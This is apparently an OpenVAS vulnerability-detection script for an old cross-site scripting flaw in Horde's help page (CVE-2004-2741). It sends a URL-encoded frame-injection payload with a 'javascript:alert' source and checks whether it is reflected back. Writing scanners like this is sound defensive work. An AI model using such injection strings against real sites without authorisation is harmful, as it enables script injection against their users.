CPE = "cpe:/a:horde:horde_groupware";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.15605" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_cve_id( "CVE-2004-2741" );
	script_bugtraq_id( 11546 );
	script_xref( name: "OSVDB", value: "11164" );
	script_name( "Horde Help Subsystem XSS" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2004 George A. Theall" );
	script_family( "Web application abuses" );
	script_dependencies( "horde_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "horde/installed" );
	script_tag( name: "solution", value: "Upgrade to Horde version 2.2.7 or later." );
	script_tag( name: "summary", value: "The target is running at least one instance of Horde in which the help
  subsystem is vulnerable to a cross site scripting attack since information passed to the help window is not
  properly sanitized." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/help.php?show=index&module=vttest%22%3E%3Cframe%20src=%22javascript:alert(42)%22%20";
if(http_vuln_check( port: port, url: url, pattern: "frame src=\"javascript:alert", check_header: TRUE )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

